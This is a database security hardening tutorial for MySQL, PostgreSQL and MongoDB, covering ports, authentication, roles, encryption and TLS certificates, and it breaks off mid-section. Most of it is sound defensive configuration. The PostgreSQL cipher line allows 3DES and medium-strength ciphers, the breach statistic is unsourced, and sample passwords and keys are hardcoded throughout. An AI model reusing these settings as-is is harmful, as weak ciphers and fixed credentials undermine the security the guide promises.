---
title: Database Security
description: Database security tutorial covering MySQL, PostgreSQL, and MongoDB. Includes port hardening, authentication, RBAC, encryption, SQL injection prevention, audit logging, backup security, SSL/TLS, data masking, privilege minimization, and compliance frameworks.
navigation:
  icon: i-lucide-database
  title: Database Security
---

## Why Database Security Matters

Your database is the **crown jewel** of your infrastructure. It holds user credentials, financial records, personal data, intellectual property, and business-critical information. A compromised database means a compromised business.

::caution
**90% of data breaches** involve a database at some point in the attack chain. Whether through SQL injection, stolen credentials, misconfiguration, or insider threats — the database is almost always the ultimate target.
::

```text [Attack Surface of an Unprotected Database]

  ┌──────────────────────────────────────────────────────────────────┐
  │                        INTERNET                                   │
  │                                                                    │
  │   👤 Attacker    👤 Insider     🤖 Bot      🕵️ APT Group          │
  └────┬──────────────┬─────────────┬────────────┬───────────────────┘
       │              │             │            │
       ▼              ▼             ▼            ▼
  ┌────────────────────────────────────────────────────────────────┐
  │                    ATTACK VECTORS                               │
  │                                                                │
  │  🔓 Default Ports     🔑 Weak Auth       💉 SQL Injection     │
  │  (3306,5432,27017)    (root/no password)  (Unparameterized)    │
  │                                                                │
  │  📡 No Encryption     🔓 Excessive       📋 No Audit Logs     │
  │  (Plaintext traffic)  Privileges         (No accountability)   │
  │                                                                │
  │  💾 Unencrypted       🚫 No Firewall     📦 Unpatched         │
  │  Backups              Rules              Software              │
  └──────────────────────────┬─────────────────────────────────────┘
                             │
                             ▼
  ┌──────────────────────────────────────────────────────────────┐
  │                    💾 DATABASE                                │
  │                                                              │
  │   👤 Users Table      💳 Payment Data     📋 Business Data   │
  │   🔑 Credentials      🏥 Health Records   📧 Emails / PII   │
  │                                                              │
  │               💀 BREACH = GAME OVER 💀                       │
  └──────────────────────────────────────────────────────────────┘
```

### Database Port Reference

| Database       | Default Port | Protocol | Encrypted Port |
| -------------- | ------------ | -------- | -------------- |
| **MySQL**      | 3306         | TCP      | 3306 (STARTTLS) |
| **PostgreSQL** | 5432         | TCP      | 5432 (SSL)      |
| **MongoDB**    | 27017        | TCP      | 27017 (TLS)     |
| **Redis**      | 6379         | TCP      | 6380 (TLS)      |
| **MSSQL**      | 1433         | TCP      | 1433 (TLS)      |
| **Oracle**     | 1521         | TCP      | 2484 (TCPS)     |
| **MariaDB**    | 3306         | TCP      | 3306 (STARTTLS) |
| **CockroachDB**| 26257        | TCP      | 26257 (TLS)     |
| **Cassandra**  | 9042         | TCP      | 9142 (TLS)      |

---

## 1 — Default Port Changing

### Why Change Default Ports

::tabs
  :::tabs-item{icon="i-lucide-shield-alert" label="The Argument For"}
  Changing default ports provides a **thin layer of defense** known as "security through obscurity." While it should **never be your only defense**, it does:

  - **Reduce automated scanning noise** — Bots scan default ports first
  - **Slow down unsophisticated attackers** — Script kiddies often skip non-standard ports
  - **Reduce log pollution** — Fewer automated connection attempts
  - **Add one more step** for an attacker to discover
  - **Comply with certain security frameworks** that require non-default ports
  :::

  :::tabs-item{icon="i-lucide-shield-off" label="The Argument Against"}
  Security through obscurity is **not real security**. A determined attacker will:

  - Run a full port scan (`nmap -p-`) and find any open port in minutes
  - Use service fingerprinting (`nmap -sV`) to identify the database regardless of port
  - Find the port in application configuration files or connection strings
  - Use Shodan/Censys to discover non-standard ports

  **Verdict:** Change ports as a minor hardening step, but **never rely on it** as a security measure. Always combine with authentication, encryption, and firewall rules.
  :::
::

### MySQL — Change Default Port (3306)

```ini [/etc/mysql/mysql.conf.d/mysqld.cnf]
[mysqld]
# Change MySQL port from 3306 to a custom port
port = 13306

# Bind to specific interface (not 0.0.0.0)
bind-address = 127.0.0.1
```

```bash [Apply and Verify — MySQL]
# Restart MySQL service
sudo systemctl restart mysql

# Verify MySQL is listening on new port
sudo ss -tlnp | grep 13306
# Expected output:
# LISTEN  0  151  127.0.0.1:13306  0.0.0.0:*  users:(("mysqld",pid=1234,fd=22))

# Test connection on new port
mysql -u root -p -P 13306 -h 127.0.0.1

# Update firewall rules
sudo ufw deny 3306/tcp           # Block old port
sudo ufw allow from 10.0.0.0/24 to any port 13306 proto tcp  # Allow new port from trusted network
sudo ufw reload
```

### PostgreSQL — Change Default Port (5432)

```ini [/etc/postgresql/16/main/postgresql.conf]
# Change PostgreSQL port from 5432 to custom port
port = 15432

# Listen on specific addresses
listen_addresses = 'localhost,10.0.0.10'
```

```bash [Apply and Verify — PostgreSQL]
# Restart PostgreSQL
sudo systemctl restart postgresql

# Verify listening port
sudo ss -tlnp | grep 15432
# LISTEN  0  244  10.0.0.10:15432  0.0.0.0:*  users:(("postgres",pid=2345,fd=7))

# Test connection
psql -U postgres -p 15432 -h 127.0.0.1

# Update firewall
sudo ufw deny 5432/tcp
sudo ufw allow from 10.0.0.0/24 to any port 15432 proto tcp
sudo ufw reload
```

### MongoDB — Change Default Port (27017)

```yaml [/etc/mongod.conf]
# Network interfaces
net:
  port: 27117
  bindIp: 127.0.0.1,10.0.0.10
  # Never bind to 0.0.0.0 in production
```

```bash [Apply and Verify — MongoDB]
# Restart MongoDB
sudo systemctl restart mongod

# Verify listening port
sudo ss -tlnp | grep 27117
# LISTEN  0  4096  127.0.0.1:27117  0.0.0.0:*  users:(("mongod",pid=3456,fd=12))

# Test connection
mongosh --port 27117

# Update firewall
sudo ufw deny 27017/tcp
sudo ufw allow from 10.0.0.0/24 to any port 27117 proto tcp
```

### Application Connection String Updates

::warning
After changing ports, **every application, monitoring system, backup script, and connection string** must be updated. Failure to update all connection points will cause outages.
::

```text [Connection String Updates]
MySQL:
  Before: mysql://app_user:password@db-server:3306/mydb
  After:  mysql://app_user:password@db-server:13306/mydb

PostgreSQL:
  Before: postgresql://app_user:password@db-server:5432/mydb
  After:  postgresql://app_user:password@db-server:15432/mydb

MongoDB:
  Before: mongodb://app_user:password@db-server:27017/mydb
  After:  mongodb://app_user:password@db-server:27117/mydb
```

---

## 2 — Authentication Methods & User Privileges

### MySQL Authentication

::steps{level="4"}

#### Understand MySQL authentication plugins

```sql [Check Current Authentication Plugins]
-- View available authentication plugins
SELECT PLUGIN_NAME, PLUGIN_STATUS FROM INFORMATION_SCHEMA.PLUGINS
WHERE PLUGIN_TYPE = 'AUTHENTICATION';

-- Check current user authentication methods
SELECT user, host, plugin, authentication_string
FROM mysql.user;
```

```text [MySQL Authentication Plugins]
Plugin                     Security    Description
──────────────────────     ────────    ───────────
mysql_native_password      Medium      SHA1-based (legacy, avoid in new installs)
caching_sha2_password      High        SHA-256 with caching (MySQL 8.0+ default)
sha256_password            High        SHA-256 without caching
auth_socket                High        Unix socket authentication (local only)
mysql_no_login             N/A         Prevents login (for locked service accounts)
authentication_ldap_sasl   High        LDAP integration (Enterprise)
authentication_kerberos    High        Kerberos integration (Enterprise)
```

#### Set the default authentication plugin

```ini [/etc/mysql/mysql.conf.d/mysqld.cnf]
[mysqld]
# Use the most secure authentication plugin
default_authentication_plugin = caching_sha2_password

# Password validation
validate_password.policy = STRONG
validate_password.length = 14
validate_password.mixed_case_count = 1
validate_password.number_count = 1
validate_password.special_char_count = 1

# Password expiration
default_password_lifetime = 90

# Failed login attempts
max_connect_errors = 5

# Connection timeout
wait_timeout = 300
interactive_timeout = 300
```

#### Create users with secure authentication

```sql [Create Secure MySQL Users]
-- Application user with minimal privileges
CREATE USER 'app_user'@'10.0.0.%'
  IDENTIFIED WITH caching_sha2_password BY 'Str0ng!P@ssw0rd#2024'
  PASSWORD EXPIRE INTERVAL 90 DAY
  FAILED_LOGIN_ATTEMPTS 5
  PASSWORD_LOCK_TIME 1;

-- Read-only reporting user
CREATE USER 'report_user'@'10.0.0.%'
  IDENTIFIED WITH caching_sha2_password BY 'R3p0rt!S3cure#Key'
  PASSWORD EXPIRE INTERVAL 90 DAY;

-- Backup user (specific privileges only)
CREATE USER 'backup_user'@'localhost'
  IDENTIFIED WITH caching_sha2_password BY 'B@ckup!S3cur3#2024'
  PASSWORD EXPIRE INTERVAL 180 DAY;

-- Monitoring user (read-only system tables)
CREATE USER 'monitor_user'@'localhost'
  IDENTIFIED WITH caching_sha2_password BY 'M0n!t0r#S3cure'
  PASSWORD EXPIRE INTERVAL 90 DAY;
```

#### Grant specific privileges

```sql [Grant Minimal Privileges — MySQL]
-- Application user: CRUD on specific database only
GRANT SELECT, INSERT, UPDATE, DELETE ON myapp_db.*
  TO 'app_user'@'10.0.0.%';

-- Report user: read-only on specific tables
GRANT SELECT ON myapp_db.orders TO 'report_user'@'10.0.0.%';
GRANT SELECT ON myapp_db.products TO 'report_user'@'10.0.0.%';
GRANT SELECT ON myapp_db.customers TO 'report_user'@'10.0.0.%';
-- NEVER: GRANT SELECT ON myapp_db.* (includes user/password tables)

-- Backup user: minimum required for mysqldump
GRANT SELECT, SHOW VIEW, TRIGGER, LOCK TABLES, EVENT, RELOAD
  ON *.* TO 'backup_user'@'localhost';

-- Monitor user: process list and status only
GRANT PROCESS, REPLICATION CLIENT ON *.* TO 'monitor_user'@'localhost';

-- Apply privilege changes
FLUSH PRIVILEGES;
```

#### Remove insecure defaults

```sql [Remove Anonymous Users and Insecure Defaults]
-- Remove anonymous users
DELETE FROM mysql.user WHERE User='';

-- Remove remote root access
DELETE FROM mysql.user WHERE User='root' AND Host NOT IN ('localhost', '127.0.0.1', '::1');

-- Set strong root password
ALTER USER 'root'@'localhost'
  IDENTIFIED WITH caching_sha2_password BY 'R00t!Sup3rS3cure#2024';

-- Remove test database
DROP DATABASE IF EXISTS test;
DELETE FROM mysql.db WHERE Db='test' OR Db='test\\_%';

-- Verify
SELECT user, host, plugin FROM mysql.user;
SHOW GRANTS FOR 'app_user'@'10.0.0.%';

FLUSH PRIVILEGES;
```

::

### PostgreSQL Authentication

::steps{level="4"}

#### Configure pg_hba.conf (Host-Based Authentication)

```conf [/etc/postgresql/16/main/pg_hba.conf]
# ═══════════════════════════════════════════════════════════════════
# PostgreSQL Host-Based Authentication Configuration
# ═══════════════════════════════════════════════════════════════════
#
# TYPE    DATABASE        USER            ADDRESS           METHOD
# ──────  ──────────────  ──────────────  ────────────────  ───────

# Local connections (Unix socket)
# peer = verify OS username matches PostgreSQL username
local   all             postgres                          peer
local   all             all                               peer

# Localhost connections via TCP — use SCRAM-SHA-256
host    all             all             127.0.0.1/32      scram-sha-256
host    all             all             ::1/128           scram-sha-256

# Application servers — specific database, specific user, SCRAM-SHA-256
host    myapp_db        app_user        10.0.0.0/24       scram-sha-256

# Monitoring — specific user from monitoring server
host    all             monitor_user    10.0.0.50/32      scram-sha-256

# Backup server — replication and backup user
host    replication     repl_user       10.0.0.20/32      scram-sha-256
host    all             backup_user     10.0.0.20/32      scram-sha-256

# SSL-required connections from external networks
hostssl myapp_db        app_user        172.16.0.0/16     scram-sha-256

# DENY ALL other connections (explicit deny)
host    all             all             0.0.0.0/0         reject
host    all             all             ::/0              reject
```

#### Set password encryption to SCRAM-SHA-256

```ini [/etc/postgresql/16/main/postgresql.conf]
# Authentication
password_encryption = scram-sha-256    # NOT md5

# Connection security
ssl = on
ssl_cert_file = '/etc/postgresql/ssl/server.crt'
ssl_key_file = '/etc/postgresql/ssl/server.key'
ssl_ca_file = '/etc/postgresql/ssl/ca.crt'
ssl_min_protocol_version = 'TLSv1.2'
ssl_ciphers = 'HIGH:MEDIUM:+3DES:!aNULL'

# Connection limits
max_connections = 100
superuser_reserved_connections = 3

# Authentication timeout
authentication_timeout = 30s

# Password policy (requires passwordcheck extension)
shared_preload_libraries = 'passwordcheck'
```

#### Create roles with proper privileges

```sql [Create Secure PostgreSQL Roles]
-- Application role (non-superuser, non-createdb)
CREATE ROLE app_user
  LOGIN
  PASSWORD 'Str0ng!P@ssw0rd#2024'
  NOSUPERUSER
  NOCREATEDB
  NOCREATEROLE
  CONNECTION LIMIT 20
  VALID UNTIL '2025-12-31';

-- Read-only role
CREATE ROLE readonly_role NOLOGIN;
GRANT CONNECT ON DATABASE myapp_db TO readonly_role;
GRANT USAGE ON SCHEMA public TO readonly_role;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO readonly_role;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO readonly_role;

-- Assign readonly role to report user
CREATE ROLE report_user LOGIN PASSWORD 'R3p0rt!S3cure#2024' NOSUPERUSER;
GRANT readonly_role TO report_user;

-- Backup role
CREATE ROLE backup_user
  LOGIN
  PASSWORD 'B@ckup!S3cur3#2024'
  NOSUPERUSER NOCREATEDB NOCREATEROLE;
GRANT CONNECT ON DATABASE myapp_db TO backup_user;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO backup_user;

-- Monitoring role
CREATE ROLE monitor_user
  LOGIN
  PASSWORD 'M0n!t0r#S3cure'
  NOSUPERUSER NOCREATEDB NOCREATEROLE
  CONNECTION LIMIT 3;
GRANT pg_monitor TO monitor_user;

-- Grant app_user specific privileges
GRANT CONNECT ON DATABASE myapp_db TO app_user;
GRANT USAGE ON SCHEMA public TO app_user;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_user;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT SELECT, INSERT, UPDATE, DELETE ON TABLES TO app_user;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT USAGE, SELECT ON SEQUENCES TO app_user;
```

#### Implement Row-Level Security (RLS)

```sql [Row-Level Security — PostgreSQL]
-- Enable RLS on sensitive tables
ALTER TABLE customer_data ENABLE ROW LEVEL SECURITY;
ALTER TABLE customer_data FORCE ROW LEVEL SECURITY;

-- Policy: Users can only see data for their own department
CREATE POLICY department_isolation ON customer_data
  FOR ALL
  USING (department_id = current_setting('app.department_id')::int);

-- Policy: Admin users can see everything
CREATE POLICY admin_full_access ON customer_data
  FOR ALL
  TO admin_role
  USING (true);

-- Policy: Read-only users can only SELECT
CREATE POLICY readonly_select ON customer_data
  FOR SELECT
  TO readonly_role
  USING (true);

-- Set department context in application connection
SET app.department_id = '42';
-- Now all queries on customer_data are automatically filtered
```

::

### MongoDB Authentication

::steps{level="4"}

#### Enable authentication in mongod.conf

```yaml [/etc/mongod.conf]
security:
  authorization: enabled
  # Enable SCRAM-SHA-256 (default in MongoDB 4.0+)
  # For x.509: clusterAuthMode: x509

net:
  port: 27017
  bindIp: 127.0.0.1,10.0.0.10
  tls:
    mode: requireTLS
    certificateKeyFile: /etc/mongodb/ssl/mongodb.pem
    CAFile: /etc/mongodb/ssl/ca.pem
    disabledProtocols: TLS1_0,TLS1_1

setParameter:
  authenticationMechanisms: SCRAM-SHA-256
  # Disable SCRAM-SHA-1 for better security
```

#### Create admin and application users

```javascript [MongoDB User Creation]
// Connect to MongoDB first without auth (initial setup only)
// mongosh --port 27017

// Switch to admin database
use admin

// Create admin user
db.createUser({
  user: "admin",
  pwd: "Adm!n#Sup3rS3cure2024",
  roles: [
    { role: "userAdminAnyDatabase", db: "admin" },
    { role: "readWriteAnyDatabase", db: "admin" },
    { role: "dbAdminAnyDatabase", db: "admin" },
    { role: "clusterAdmin", db: "admin" }
  ],
  mechanisms: ["SCRAM-SHA-256"]
})

// Switch to application database
use myapp_db

// Application user — read/write on specific database only
db.createUser({
  user: "app_user",
  pwd: "App!Us3r#S3cure2024",
  roles: [
    { role: "readWrite", db: "myapp_db" }
  ],
  mechanisms: ["SCRAM-SHA-256"]
})

// Read-only reporting user
db.createUser({
  user: "report_user",
  pwd: "R3p0rt!S3cure#2024",
  roles: [
    { role: "read", db: "myapp_db" }
  ],
  mechanisms: ["SCRAM-SHA-256"]
})

// Backup user
use admin
db.createUser({
  user: "backup_user",
  pwd: "B@ckup!S3cur3#2024",
  roles: [
    { role: "backup", db: "admin" },
    { role: "restore", db: "admin" }
  ],
  mechanisms: ["SCRAM-SHA-256"]
})

// Monitoring user
db.createUser({
  user: "monitor_user",
  pwd: "M0n!t0r#S3cure2024",
  roles: [
    { role: "clusterMonitor", db: "admin" }
  ],
  mechanisms: ["SCRAM-SHA-256"]
})
```

#### Create custom roles

```javascript [Custom MongoDB Roles]
use myapp_db

// Custom role: read/write on specific collections only
db.createRole({
  role: "orderManager",
  privileges: [
    {
      resource: { db: "myapp_db", collection: "orders" },
      actions: ["find", "insert", "update", "remove"]
    },
    {
      resource: { db: "myapp_db", collection: "order_items" },
      actions: ["find", "insert", "update", "remove"]
    },
    {
      resource: { db: "myapp_db", collection: "products" },
      actions: ["find"]  // Read-only on products
    }
  ],
  roles: []  // No inherited roles
})

// Custom role: data analyst (read-only + aggregation)
db.createRole({
  role: "dataAnalyst",
  privileges: [
    {
      resource: { db: "myapp_db", collection: "" },  // All collections
      actions: ["find", "listCollections", "collStats", "dbStats"]
    }
  ],
  roles: []
})

// Assign custom role to user
db.createUser({
  user: "order_manager",
  pwd: "0rd3r!M@nag3r#2024",
  roles: [
    { role: "orderManager", db: "myapp_db" }
  ]
})
```

::

---

## 3 — Role-Based Access Control (RBAC)

```text [RBAC Architecture]

  ┌──────────────────────────────────────────────────────────┐
  │                   RBAC MODEL                              │
  │                                                          │
  │   USERS              ROLES              PERMISSIONS      │
  │   ─────              ─────              ───────────      │
  │                                                          │
  │   👤 alice ───────► 📋 db_admin ──────► CREATE TABLE     │
  │                                  ──────► DROP TABLE      │
  │                                  ──────► ALTER TABLE     │
  │                                  ──────► GRANT           │
  │                                                          │
  │   👤 bob   ───────► 📋 app_rw ────────► SELECT           │
  │   👤 carol ───────►              ────► INSERT           │
  │                                  ────► UPDATE           │
  │                                  ────► DELETE           │
  │                                                          │
  │   👤 dave  ───────► 📋 app_ro ────────► SELECT           │
  │   👤 eve   ───────►                                     │
  │                                                          │
  │   🤖 backup ──────► 📋 backup_role ──► SELECT           │
  │                                  ────► LOCK TABLES      │
  │                                  ────► RELOAD           │
  │                                                          │
  │   🤖 monitor ─────► 📋 monitor_role ─► PROCESS          │
  │                                  ────► REPL CLIENT      │
  └──────────────────────────────────────────────────────────┘
```

### MySQL RBAC

```sql [MySQL Role Management]
-- ═══════════════════════════════════════════════════
-- Create roles
-- ═══════════════════════════════════════════════════

CREATE ROLE 'app_read_role', 'app_write_role', 'app_admin_role',
            'backup_role', 'monitor_role';

-- Grant privileges to roles
GRANT SELECT ON myapp_db.* TO 'app_read_role';

GRANT SELECT, INSERT, UPDATE, DELETE ON myapp_db.* TO 'app_write_role';

GRANT ALL PRIVILEGES ON myapp_db.* TO 'app_admin_role';
GRANT CREATE, ALTER, DROP, INDEX ON myapp_db.* TO 'app_admin_role';

GRANT SELECT, SHOW VIEW, TRIGGER, LOCK TABLES, RELOAD ON *.* TO 'backup_role';

GRANT PROCESS, REPLICATION CLIENT ON *.* TO 'monitor_role';

-- ═══════════════════════════════════════════════════
-- Assign roles to users
-- ═══════════════════════════════════════════════════

GRANT 'app_read_role' TO 'report_user'@'10.0.0.%';
GRANT 'app_write_role' TO 'app_user'@'10.0.0.%';
GRANT 'app_admin_role' TO 'dba_user'@'localhost';
GRANT 'backup_role' TO 'backup_user'@'localhost';
GRANT 'monitor_role' TO 'monitor_user'@'localhost';

-- Set default roles (active on login)
SET DEFAULT ROLE 'app_write_role' TO 'app_user'@'10.0.0.%';
SET DEFAULT ROLE 'app_read_role' TO 'report_user'@'10.0.0.%';
SET DEFAULT ROLE ALL TO 'dba_user'@'localhost';

-- ═══════════════════════════════════════════════════
-- Role hierarchies
-- ═══════════════════════════════════════════════════

-- app_admin_role inherits from app_write_role
GRANT 'app_read_role' TO 'app_write_role';
GRANT 'app_write_role' TO 'app_admin_role';

-- Verify role assignments
SELECT * FROM mysql.role_edges;
SHOW GRANTS FOR 'app_user'@'10.0.0.%' USING 'app_write_role';
```

### PostgreSQL RBAC

```sql [PostgreSQL Role Management]
-- ═══════════════════════════════════════════════════
-- Create group roles (NOLOGIN = can't connect directly)
-- ═══════════════════════════════════════════════════

CREATE ROLE app_read NOLOGIN;
CREATE ROLE app_write NOLOGIN;
CREATE ROLE app_admin NOLOGIN;

-- ═══════════════════════════════════════════════════
-- Grant privileges to group roles
-- ═══════════════════════════════════════════════════

-- Read-only role
GRANT CONNECT ON DATABASE myapp_db TO app_read;
GRANT USAGE ON SCHEMA public TO app_read;
GRANT SELECT ON ALL TABLES IN SCHEMA public TO app_read;
ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT ON TABLES TO app_read;

-- Read-write role (inherits from app_read)
GRANT app_read TO app_write;
GRANT INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_write;
GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO app_write;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT INSERT, UPDATE, DELETE ON TABLES TO app_write;
ALTER DEFAULT PRIVILEGES IN SCHEMA public
  GRANT USAGE, SELECT ON SEQUENCES TO app_write;

-- Admin role (inherits from app_write)
GRANT app_write TO app_admin;
GRANT CREATE ON SCHEMA public TO app_admin;
GRANT ALL PRIVILEGES ON ALL TABLES IN SCHEMA public TO app_admin;

-- ═══════════════════════════════════════════════════
-- Assign group roles to login roles
-- ═══════════════════════════════════════════════════

-- app_user gets read-write
CREATE ROLE app_user LOGIN PASSWORD 'Str0ng!P@ss#2024';
GRANT app_write TO app_user;

-- report_user gets read-only
CREATE ROLE report_user LOGIN PASSWORD 'R3p0rt!P@ss#2024';
GRANT app_read TO report_user;

-- dba_user gets admin
CREATE ROLE dba_user LOGIN PASSWORD 'Db@!Adm1n#2024';
GRANT app_admin TO dba_user;

-- ═══════════════════════════════════════════════════
-- Role inheritance control
-- ═══════════════════════════════════════════════════

-- INHERIT means privileges are automatically available
ALTER ROLE app_user INHERIT;

-- NOINHERIT means must explicitly SET ROLE to activate
ALTER ROLE dba_user NOINHERIT;
-- dba_user must: SET ROLE app_admin; to get admin privileges

-- Verify
\du+
SELECT r.rolname, ARRAY_AGG(m.rolname) AS member_of
FROM pg_auth_members am
JOIN pg_roles r ON r.oid = am.member
JOIN pg_roles m ON m.oid = am.roleid
GROUP BY r.rolname;
```

### MongoDB RBAC

```text [MongoDB Built-in Roles Reference]
Role                    Level       Description
────────────────────    ─────────   ─────────────────────────────────────
read                    Database    Read all non-system collections
readWrite               Database    Read + write all non-system collections
dbAdmin                 Database    Schema admin, stats, indexes (no user data read)
dbOwner                 Database    Combines readWrite + dbAdmin + userAdmin
userAdmin               Database    Create/manage users and roles
clusterAdmin            Cluster     Highest cluster admin privilege
clusterManager          Cluster     Manage + monitor cluster
clusterMonitor          Cluster     Read-only monitoring
hostManager             Cluster     Server management
backup                  Cluster     Backup privileges
restore                 Cluster     Restore privileges
readAnyDatabase         Cluster     Read all databases
readWriteAnyDatabase    Cluster     Read/write all databases
userAdminAnyDatabase    Cluster     Manage users in any database
dbAdminAnyDatabase      Cluster     DB admin on any database
root                    Cluster     Superuser — ALL privileges (avoid in prod!)
```

---

## 4 — Database Encryption

### Encryption at Rest

::tabs
  :::tabs-item{icon="i-lucide-database" label="MySQL TDE"}
  ```ini [/etc/mysql/mysql.conf.d/mysqld.cnf — Encryption at Rest]
  [mysqld]
  # Install keyring plugin for key management
  early-plugin-load = keyring_file.so
  keyring_file_data = /var/lib/mysql-keyring/keyring

  # OR use HashiCorp Vault for key management (recommended for production)
  # early-plugin-load = keyring_hashicorp.so
  # keyring_hashicorp_server_url = https://vault.example.com:8200
  # keyring_hashicorp_token = s.xxxxxxxxxxxxxxxxx
  # keyring_hashicorp_store_path = /v1/kv/mysql

  # Enable default table encryption
  default_table_encryption = ON

  # Enable redo log and undo log encryption
  innodb_redo_log_encrypt = ON
  innodb_undo_log_encrypt = ON

  # Binary log encryption
  binlog_encryption = ON
  ```

  ```sql [Enable Encryption on Existing Tables]
  -- Encrypt specific tablespace
  ALTER TABLE sensitive_data ENCRYPTION='Y';

  -- Encrypt entire database
  ALTER DATABASE myapp_db DEFAULT ENCRYPTION='Y';

  -- Verify encryption status
  SELECT TABLE_SCHEMA, TABLE_NAME, CREATE_OPTIONS
  FROM INFORMATION_SCHEMA.TABLES
  WHERE CREATE_OPTIONS LIKE '%ENCRYPTION%';

  -- Check keyring status
  SELECT * FROM performance_schema.keyring_keys;
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="PostgreSQL Encryption"}
  ```sql [PostgreSQL pgcrypto Extension]
  -- Enable pgcrypto extension
  CREATE EXTENSION IF NOT EXISTS pgcrypto;

  -- Column-level encryption using pgcrypto
  -- Encrypt sensitive data before storing
  CREATE TABLE sensitive_data (
      id SERIAL PRIMARY KEY,
      username VARCHAR(100),
      -- Encrypted columns
      ssn BYTEA,
      credit_card BYTEA,
      medical_record BYTEA,
      created_at TIMESTAMP DEFAULT NOW()
  );

  -- Insert encrypted data
  INSERT INTO sensitive_data (username, ssn, credit_card)
  VALUES (
      'john_doe',
      pgp_sym_encrypt('123-45-6789', 'AES256EncryptionKey!Here'),
      pgp_sym_encrypt('4111-1111-1111-1111', 'AES256EncryptionKey!Here')
  );

  -- Read decrypted data
  SELECT
      username,
      pgp_sym_decrypt(ssn, 'AES256EncryptionKey!Here') AS ssn,
      pgp_sym_decrypt(credit_card, 'AES256EncryptionKey!Here') AS credit_card
  FROM sensitive_data;

  -- Hash passwords with bcrypt
  INSERT INTO users (username, password_hash)
  VALUES ('admin', crypt('MyPassword123', gen_salt('bf', 12)));

  -- Verify password
  SELECT username FROM users
  WHERE password_hash = crypt('MyPassword123', password_hash);
  ```

  ```bash [Disk-Level Encryption with LUKS]
  # Create encrypted partition for PostgreSQL data
  sudo cryptsetup luksFormat /dev/sdb1
  sudo cryptsetup luksOpen /dev/sdb1 pg_encrypted
  sudo mkfs.ext4 /dev/mapper/pg_encrypted
  sudo mount /dev/mapper/pg_encrypted /var/lib/postgresql/data

  # Set proper ownership
  sudo chown -R postgres:postgres /var/lib/postgresql/data
  sudo chmod 700 /var/lib/postgresql/data
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="MongoDB Encryption"}
  ```yaml [/etc/mongod.conf — Encrypted Storage Engine]
  security:
    enableEncryption: true
    encryptionCipherMode: AES256-CBC
    encryptionKeyFile: /etc/mongodb/encryption/mongodb-keyfile

    # OR use KMIP for enterprise key management
    # kmip:
    #   serverName: kmip.example.com
    #   port: 5696
    #   clientCertificateFile: /etc/mongodb/ssl/client.pem
    #   serverCAFile: /etc/mongodb/ssl/ca.pem

  storage:
    engine: wiredTiger
    wiredTiger:
      engineConfig:
        # Enable block compression alongside encryption
        journalCompressor: snappy
  ```

  ```bash [Generate MongoDB Encryption Key]
  # Generate 256-bit encryption key
  openssl rand -base64 32 > /etc/mongodb/encryption/mongodb-keyfile
  chmod 600 /etc/mongodb/encryption/mongodb-keyfile
  chown mongodb:mongodb /etc/mongodb/encryption/mongodb-keyfile

  # Restart MongoDB
  sudo systemctl restart mongod

  # Verify encryption is active
  mongosh --eval "db.serverStatus().encryptionAtRest"
  ```
  :::
::

### Encryption in Transit (SSL/TLS)

::tabs
  :::tabs-item{icon="i-lucide-lock" label="Certificate Generation"}
  ```bash [Generate SSL Certificates for All Databases]
  # ═══════════════════════════════════════════════════
  # Create Certificate Authority (CA)
  # ═══════════════════════════════════════════════════
  mkdir -p /etc/db-ssl && cd /etc/db-ssl

  # Generate CA private key
  openssl genrsa -aes256 -out ca-key.pem 4096

  # Generate CA certificate (10 year validity)
  openssl req -new -x509 -sha256 -days 3650 \
    -key ca-key.pem \
    -out ca-cert.pem \
    -subj "/C=US/ST=State/L=City/O=Company/CN=Database-CA"

  # ═══════════════════════════════════════════════════
  # Generate Server Certificate
  # ═══════════════════════════════════════════════════

  # Server private key
  openssl genrsa -out server-key.pem 4096

  # Certificate signing request
  openssl req -new -sha256 \
    -key server-key.pem \
    -out server-req.pem \
    -subj "/C=US/ST=State/L=City/O=Company/CN=db-server.example.com"

  # Create extension file for SAN
  cat > server-ext.cnf << EOF
  subjectAltName = DNS:db-server.example.com,DNS:db-server,IP:10.0.0.10,IP:127.0.0.1
  EOF

  # Sign server certificate with CA
  openssl x509 -req -sha256 -days 365 \
    -in server-req.pem \
    -CA ca-cert.pem \
    -CAkey ca-key.pem \
    -CAcreateserial \
    -out server-cert.pem \
    -extfile server-ext.cnf

  # ═══════════════════════════════════════════════════
  # Generate Client Certificate (for mutual TLS)
  # ═══════════════════════════════════════════════════

  openssl genrsa -out client-key.pem 4096

  openssl req -new -sha256 \
    -key client-key.pem \
    -out client-req.pem \
    -subj "/C=US/ST=State/L=City/O=Company/CN=db-client"

  openssl x509 -req -sha256 -days 365 \
    -in client-req.pem \
    -CA ca-cert.pem \
    -CAkey ca-key.pem \
    -CAcreateserial \
    -out client-cert.pem

  # Set permissions
  chmod 600 *-key.pem
  chmod 644 *-cert.pem ca-cert.pem

  # Verify certificate
  openssl verify -CAfile ca-cert.pem server-cert.pem
  openssl verify -CAfile ca-cert.pem client-cert.pem
  ```
  :::

  :::tabs-item{icon="i-lucide-database" label="MySQL SSL"}
  ```ini [/etc/mysql/mysql.conf.d/mysqld.cnf — SSL]
  [mysqld]
  # Require SSL for all connections
  require_secure_transport = ON

  # SSL certificate paths
  ssl-ca = /etc/db-ssl/ca-cert.pem
  ssl-cert = /etc/db-ssl/server-cert.pem
  ssl-key = /etc/db-ssl/server-key.pem

  # Minimum TLS version
  tls_version = TLSv1.2,TLSv1.3

  # Strong cipher suites only
  ssl-cipher = ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384
  ```

  ```sql [Require SSL per User — MySQL]
  -- Require SSL for specific users
  ALTER USER 'app_user'@'10.0.0.%' REQUIRE SSL;

  -- Require specific certificate (mutual TLS)
  ALTER USER 'app_user'@'10.0.0.%'
    REQUIRE X509;

